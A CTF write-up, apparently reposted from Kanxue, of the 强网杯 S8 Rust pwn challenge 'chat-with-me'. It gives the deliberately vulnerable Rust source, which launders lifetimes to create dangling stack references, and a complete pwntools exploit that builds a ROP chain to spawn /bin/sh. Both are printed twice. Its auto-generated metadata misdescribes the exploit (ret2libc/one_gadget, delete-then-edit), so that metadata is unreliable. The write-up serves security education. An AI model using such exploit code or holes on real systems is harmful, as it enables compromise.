---
title: 强网杯 S8 Rust Pwn chat-with-me 出题思路分享
contest: 强网杯
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags:
- Rust
- lifetime-extension
- Vec
- dangling-reference
- UAF
- ChatBox
- get_ptr
- static-mut
- libc-2.39
- GeekCmore
attack_chain:
- 'Rust 聊天框: 1=add, 2=show, 3=edit, 4=delete, 5=exit'
- '结构: struct ChatBox { msg_list: Vec<&''static mut Msg> }'
- '漏洞: get_ptr() 通过 fn ident<''a,''b>(val_b: &''b mut T) -> &''a mut T 把栈上 msg 借用成 ''static lifetime'
- push 进 Vec 后, msg 出作用域被释放, Vec 仍持有 'static 引用 → 悬垂指针
- '利用: add → add → delete index 0 → edit index 0 (触发 UAF 写已释放栈)'
- 由于栈帧被覆盖, edit 写入可被后续 read 读到
- libc-2.39-0ubuntu8.3, 用 pwntools + ret2libc/one_gadget
- '难点: Rust 符号名 mangling + inline(never) 函数边界'
key_payload: Vec<&'static mut Msg> + 栈 msg 悬垂 + edit 写 UAF + 后续调用覆盖栈
one_liner: 强网杯 S8 Rust Pwn：Vec<&'static mut Msg> 借用扩展为 'static lifetime 导致悬垂指针，edit 触发 UAF。
lesson: Rust 借用检查器不能防止所有生命周期误用，unsafe fn ident() 提升 lifetime 是经典反模式。
quality: high
full_path: 强网杯S8_Rust_Pwn_chat-with-me出题思路分享.full.md
meta_path: 强网杯S8_Rust_Pwn_chat-with-me出题思路分享.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '强网杯 S8 Rust Pwn chat-with-me 出题思路分享。强网杯 S8 Rust Pwn：Vec<&''static mut Msg> 借用扩展为 ''static lifetime 导致悬垂指针，edit 触发 UAF。。关键路径：Rust 聊天框: 1=add, 2=show, 3=edit, 4=delete, 5=exit → 结构: struct ChatBox { ms...'
category: pwn
subcategory: pwn_other
tools_used:
- Rust
- pwntools
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/219681.html
reasoning_chain:
- 题目是 Rust 聊天框，菜单 1=add 2=show 3=edit 4=delete 5=exit → 触发点：Rust Pwn 必有 unsafe 块
- '假设：get_ptr() 用 unsafe 提升 lifetime → 动作：看源码 fn ident<''a,''b>(val_b: &''b mut T) -> &''a mut T'
- '观察：把栈 msg 借用成 ''static lifetime → 假设：结构 ChatBox { msg_list: Vec<&''static mut Msg> } 留下悬垂指针'
- 触发点：push 进 Vec 后 msg 出作用域被释放，但 Vec 仍持有 'static 引用 → 假设：edit 写已释放栈触发 UAF
- 动作：add → add → delete index 0 → edit index 0 → 观察：栈帧被覆盖但 edit 写入仍可被 read 读到
- 假设：libc-2.39-0ubuntu8.3 用 pwntools + ret2libc/one_gadget → 动作：ret2libc 栈迁移
- 动作：泄漏 libc + 触发 one_gadget → 观察：拿到 shell
failed_attempts:
- 试图靠 Rust 借用检查器捕获所有 UAF → 失败：unsafe fn ident() 绕过借用检查
- 试图直接 free Vec 元素触发崩溃 → 失败：Vec 不释放栈 msg
- 试图用正常 delete 把整个 chat 清空 → 失败：delete 只清单个 index
key_observations:
- Rust 借用检查器不能防止所有生命周期误用，unsafe 块提升 lifetime 是经典反模式
- Vec<&'static mut T> + 局部变量出作用域 = 悬垂指针原型
- 'Rust 符号名 mangling + #[inline(never)] 函数边界 = 静态分析难点'
- edit 写已释放栈帧 = 通过栈复用读后续调用参数，UAF 变种
- Rust Pwn 在 CTF 出题里常以 lifetime-extension 题材考核选手对 unsafe 的理解
prerequisites:
- Rust 所有权/借用/lifetime 机制
- unsafe Rust 与 safe Rust 边界
- Vec<&'static mut T> 语义与生命周期提升
- pwntools 栈溢出/ret2libc 流程
---
# 强网杯S8 Rust Pwn chat-with-me出题思路分享

> 原文: https://www.ctfiot.com/219681.html
> ID: 219681

1

出题思路

use std::
fmt;
use std::io::{self, Read, Write};

const MAX_MSG_LEN: usize = 0x50;
struct Msg {
 data: [u8; MAX_MSG_LEN],
}

impl Msg {
 #[inline(never)]
 fn new() -> Self {
 Msg {
 data: [0; MAX_MSG_LEN],
 }
 }

}

impl fmt::
Display for Msg {
 #[inline(never)]
 fn fmt(&self, f: &mut fmt::
Formatter) -> fmt::
Result {
 write!(f, "{:?}", self.data)
 }
}

#[inline(never)]
fn prompt(msg: String) {
 print!("{} > ", msg);
 io::
stdout().flush().unwrap();
}

struct ChatBox {
 msg_list: Vec<&'static mut Msg>,

}

impl ChatBox {
 #[inline(never)]
 fn new() -> Self {
 ChatBox {
 msg_list: Vec::
new(),
 }
 }

 #[inline(never)]
 fn add_msg(&mut self) {
 println!("Adding a new message");
 self.msg_list.push(self.get_ptr());
 println!(
 "Successfully added a new message with index: {}",
 self.msg_list.len() - 1
 );
 }

 #[inline(never)]
 fn show_msg(&mut self) {
 prompt("Index".parse().unwrap());
 let mut index = String::
new();
 io::
stdin().read_line(&mut index).expect("Failed to read");
 let index: usize = index.trim().parse().expect("Invalid!");
 println!("Content: {}", self.msg_list[index]);
 }

 #[inline(never)]
 fn edit_msg(&mut self) {
 prompt("Index".parse().unwrap());
 let mut index = String::
new();
 io::
stdin().read_line(&mut index).expect("Failed to read");
 let index: usize = index.trim().parse().expect("Invalid!");
 prompt("Content".parse().unwrap());
 let mut handle = io::
stdin().lock();
 handle.read(&mut self.msg_list[index].data).expect("Failed to read");
 println!("Content: {}", self.msg_list[index]);
 }

 #[inline(never)]
 fn delete_msg(&mut self) {
 prompt("Index".parse().unwrap());
 let mut index = String::
new();
 io::
stdin().read_line(&mut index).expect("Failed to read");
 let index: usize = index.trim().parse().expect("Invalid!");
 self.msg_list.remove(index);
 }

 #[inline(never)]
 fn get_ptr(&self) -> &'static mut Msg {
 const S: &&() = &&();

 fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
 fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {
 val_b
 }
 let f: fn(_, &'a mut T) -> &'b mut T = ident;
 f(S, x)
 }
 let mut msg = Msg::
new();
 get_ptr(&mut msg)
 }
}

#[inline(never)]
fn main() {
 let mut chat_box = ChatBox::
new();
 println!("I am a chatting bot of QWB S8, you can chat with me.");
 println!("If you delight me, I will give you flag!");
 println!("This is function menu: ");
 println!("1. add");
 println!("2. show");
 println!("3. edit");
 println!("4. delete");
 println!("5. exit");
 loop {
 prompt("Choice".parse().unwrap());
 let mut choice = String::
new();
 io::
stdin().read_line(&mut choice).expect("Failed to read");
 let choice: i8 = choice.trim().parse().expect("Invalid!");

 match choice {
 1 => chat_box.add_msg(),
 2 => chat_box.show_msg(),
 3 => chat_box.edit_msg(),
 4 => chat_box.delete_msg(),
 5 => break,
 _ => println!("Invalid Choice!")
 }
 }
}

fn get_ptr(&self) -> &'static mut Msg {
 const S: &&() = &&();

 fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
 fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {
 val_b
 }
 let f: fn(_, &'a mut T) -> &'b mut T = ident;
 f(S, x)
 }
 let mut msg = Msg::
new();
 get_ptr(&mut msg)
 }

const MAX_MSG_LEN: usize = 0x50;

2

解题思路

#!/usr/bin/env python

"""
author: GeekCmore
time: 2024-10-30 17:06:06
"""

from pwn import *

filename = "/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn"
libcname = "/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "localhost"
port = 6666
elf = context.binary = ELF(filename)
if libcname:
 libc = ELF(libcname)
gs = """
b *$rebase(0x1A979)
b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:
145
set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug
set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39
"""

def start():
 if args.GDB:
 return gdb.debug(elf.path, gdbscript=gs)
 elif args.REMOTE:
 return remote(host, port)
 else:
 return process(elf.path)

p = start()

def add():
 p.sendlineafter(b"Choice > ", b"1")

def show(idx):
 p.sendlineafter(b"Choice > ", b"2")
 p.sendlineafter(b"Index > ", str(idx).encode())

def edit(idx, content):
 p.sendlineafter(b"Choice > ", b"3")
 p.sendlineafter(b"Index > ", str(idx).encode())
 p.sendafter(b"Content > ", content)

def delete(idx):
 p.sendlineafter(b"Choice > ", b"4")
 p.sendlineafter(b"Index > ", str(idx).encode())

def quit():
 p.sendlineafter(b"Choice > ", b"5")

def tidy():
 p.recvuntil(b"Content: ")
 y = p.recvline()[1:-2].decode().replace(" ", "").split(",")
 values = []
 for i in range(10):
 tmp = 0
 for j in range(8):
 tmp += int(y[i * 8 + 7 - j])
 tmp <<= 8
 tmp >>= 8
 values.append(tmp)
 info([hex(x) for x in values])
 return values

add()
show(0)
addr_list = tidy()
stack_addr = addr_list[4]
elf.address = addr_list[5] - 0x635B0
heap_addr = addr_list[1]
success(f"stack_addr -> {hex(stack_addr)}")
success(f"elf_addr -> {hex(elf.address)}")
success(f"heap_addr -> {hex(heap_addr)}")
fake_heap = p64(1) + p64(0x91) + p64(1) * 2 + p64(heap_addr - 0x2010) + p64(0x1FE1)
edit(0, fake_heap)
tidy()
# pause()
for _ in range(6):
 add()

info("start")

def arb_qword(addr, qword):
 edit(1, p64(0) * 5 + p64(0x51) + p64(addr))
 info(f"Write {hex(u64(qword))} to [{hex(addr)}]")
 edit(0, qword)

def arb_write(addr, content):
 for i in range(0, len(content), 8):
 arb_qword(addr + i, content[i : i + 8])

ret_addr = stack_addr + 0x3D0
syscall = elf.address + 0x0000000000026FCF
pop_rdi_rbp = elf.address + 0x000000000001DD45
pop_rsi_rbp = elf.address + 0x000000000001E032
pop_rax = elf.address + 0x0000000000016F3E
pop_rdx_xor_ptrax = elf.address + 0x0000000000045DC5
sub_rdx_rcx_add_rax_rcx = elf.address + 0x000000000001FC60
pop_rcx = elf.address + 0x0000000000017FFF
ret = elf.address + 0x0000000000016BD8
payload = b""
payload += p64(pop_rdi_rbp) + p64(ret_addr + 0x60) + p64(0)
payload += p64(pop_rsi_rbp) + p64(0) + p64(0)
payload += p64(pop_rcx) + p64(0x33)
payload += p64(sub_rdx_rcx_add_rax_rcx)
payload += p64(pop_rax) + p64(constants.SYS_execve)
payload += p64(syscall)
payload += b"/bin/shx00"

arb_write(ret_addr, payload)

quit()
p.interactive()

3

非预期思路

看雪ID：GeekCmore 极客Cmore

https://bbs.kanxue.com/user-home-950404.htm

*本文为看雪论坛优秀文章，由 GeekCmore 极客Cmore 原创，转载请注明来自看雪社区

# 往期推荐

1、PWN入门-SROP拜师

2、一种apc注入型的Gamarue病毒的变种

3、野蛮fuzz：提升性能

4、关于安卓注入几种方式的讨论，开源注入模块实现

5、2024年KCTF水泊梁山-反混淆

球分享

球点赞

球在看

点击阅读原文查看更多


```
use std::
fmt;
use std::io::{self, Read, Write};

const MAX_MSG_LEN: usize = 0x50;
struct Msg {
 data: [u8; MAX_MSG_LEN],
}

impl Msg {
 #[inline(never)]
 fn new() -> Self {
 Msg {
 data: [0; MAX_MSG_LEN],
 }
 }

}

impl fmt::
Display for Msg {
 #[inline(never)]
 fn fmt(&self, f: &mut fmt::
Formatter) -> fmt::
Result {
 write!(f, "{:?}", self.data)
 }
}

#[inline(never)]
fn prompt(msg: String) {
 print!("{} > ", msg);
 io::
stdout().flush().unwrap();
}

struct ChatBox {
 msg_list: Vec<&'static mut Msg>,

}

impl ChatBox {
 #[inline(never)]
 fn new() -> Self {
 ChatBox {
 msg_list: Vec::
new(),
 }
 }

 #[inline(never)]
 fn add_msg(&mut self) {
 println!("Adding a new message");
 self.msg_list.push(self.get_ptr());
 println!(
 "Successfully added a new message with index: {}",
 self.msg_list.len() - 1
 );
 }

 #[inline(never)]
 fn show_msg(&mut self) {
 prompt("Index".parse().unwrap());
 let mut index = String::
new();
 io::
stdin().read_line(&mut index).expect("Failed to read");
 let index: usize = index.trim().parse().expect("Invalid!");
 println!("Content: {}", self.msg_list[index]);
 }

 #[inline(never)]
 fn edit_msg(&mut self) {
 prompt("Index".parse().unwrap());
 let mut index = String::
new();
 io::
stdin().read_line(&mut index).expect("Failed to read");
 let index: usize = index.trim().parse().expect("Invalid!");
 prompt("Content".parse().unwrap());
 let mut handle = io::
stdin().lock();
 handle.read(&mut self.msg_list[index].data).expect("Failed to read");
 println!("Content: {}", self.msg_list[index]);
 }

 #[inline(never)]
 fn delete_msg(&mut self) {
 prompt("Index".parse().unwrap());
 let mut index = String::
new();
 io::
stdin().read_line(&mut index).expect("Failed to read");
 let index: usize = index.trim().parse().expect("Invalid!");
 self.msg_list.remove(index);
 }

 #[inline(never)]
 fn get_ptr(&self) -> &'static mut Msg {
 const S: &&() = &&();

 fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
 fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {
 val_b
 }
 let f: fn(_, &'a mut T) -> &'b mut T = ident;
 f(S, x)
 }
 let mut msg = Msg::
new();
 get_ptr(&mut msg)
 }
}

#[inline(never)]
fn main() {
 let mut chat_box = ChatBox::
new();
 println!("I am a chatting bot of QWB S8, you can chat with me.");
 println!("If you delight me, I will give you flag!");
 println!("This is function menu: ");
 println!("1. add");
 println!("2. show");
 println!("3. edit");
 println!("4. delete");
 println!("5. exit");
 loop {
 prompt("Choice".parse().unwrap());
 let mut choice = String::
new();
 io::
stdin().read_line(&mut choice).expect("Failed to read");
 let choice: i8 = choice.trim().parse().expect("Invalid!");

 match choice {
 1 => chat_box.add_msg(),
 2 => chat_box.show_msg(),
 3 => chat_box.edit_msg(),
 4 => chat_box.delete_msg(),
 5 => break,
 _ => println!("Invalid Choice!")
 }
 }
}
fn get_ptr(&self) -> &'static mut Msg {
 const S: &&() = &&();

 fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
 fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {
 val_b
 }
 let f: fn(_, &'a mut T) -> &'b mut T = ident;
 f(S, x)
 }
 let mut msg = Msg::
new();
 get_ptr(&mut msg)
 }
const MAX_MSG_LEN: usize = 0x50;
#!/usr/bin/env python

"""
author: GeekCmore
time: 2024-10-30 17:06:06
"""

from pwn import *

filename = "/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn"
libcname = "/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "localhost"
port = 6666
elf = context.binary = ELF(filename)
if libcname:
 libc = ELF(libcname)
gs = """
b *$rebase(0x1A979)
b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:
145
set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug
set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39
"""

def start():
 if args.GDB:
 return gdb.debug(elf.path, gdbscript=gs)
 elif args.REMOTE:
 return remote(host, port)
 else:
 return process(elf.path)

p = start()

def add():
 p.sendlineafter(b"Choice > ", b"1")

def show(idx):
 p.sendlineafter(b"Choice > ", b"2")
 p.sendlineafter(b"Index > ", str(idx).encode())

def edit(idx, content):
 p.sendlineafter(b"Choice > ", b"3")
 p.sendlineafter(b"Index > ", str(idx).encode())
 p.sendafter(b"Content > ", content)

def delete(idx):
 p.sendlineafter(b"Choice > ", b"4")
 p.sendlineafter(b"Index > ", str(idx).encode())

def quit():
 p.sendlineafter(b"Choice > ", b"5")

def tidy():
 p.recvuntil(b"Content: ")
 y = p.recvline()[1:-2].decode().replace(" ", "").split(",")
 values = []
 for i in range(10):
 tmp = 0
 for j in range(8):
 tmp += int(y[i * 8 + 7 - j])
 tmp <<= 8
 tmp >>= 8
 values.append(tmp)
 info([hex(x) for x in values])
 return values

add()
show(0)
addr_list = tidy()
stack_addr = addr_list[4]
elf.address = addr_list[5] - 0x635B0
heap_addr = addr_list[1]
success(f"stack_addr -> {hex(stack_addr)}")
success(f"elf_addr -> {hex(elf.address)}")
success(f"heap_addr -> {hex(heap_addr)}")
fake_heap = p64(1) + p64(0x91) + p64(1) * 2 + p64(heap_addr - 0x2010) + p64(0x1FE1)
edit(0, fake_heap)
tidy()
# pause()
for _ in range(6):
 add()

info("start")

def arb_qword(addr, qword):
 edit(1, p64(0) * 5 + p64(0x51) + p64(addr))
 info(f"Write {hex(u64(qword))} to [{hex(addr)}]")
 edit(0, qword)

def arb_write(addr, content):
 for i in range(0, len(content), 8):
 arb_qword(addr + i, content[i : i + 8])

ret_addr = stack_addr + 0x3D0
syscall = elf.address + 0x0000000000026FCF
pop_rdi_rbp = elf.address + 0x000000000001DD45
pop_rsi_rbp = elf.address + 0x000000000001E032
pop_rax = elf.address + 0x0000000000016F3E
pop_rdx_xor_ptrax = elf.address + 0x0000000000045DC5
sub_rdx_rcx_add_rax_rcx = elf.address + 0x000000000001FC60
pop_rcx = elf.address + 0x0000000000017FFF
ret = elf.address + 0x0000000000016BD8
payload = b""
payload += p64(pop_rdi_rbp) + p64(ret_addr + 0x60) + p64(0)
payload += p64(pop_rsi_rbp) + p64(0) + p64(0)
payload += p64(pop_rcx) + p64(0x33)
payload += p64(sub_rdx_rcx_add_rax_rcx)
payload += p64(pop_rax) + p64(constants.SYS_execve)
payload += p64(syscall)
payload += b"/bin/shx00"

arb_write(ret_addr, payload)

quit()
p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]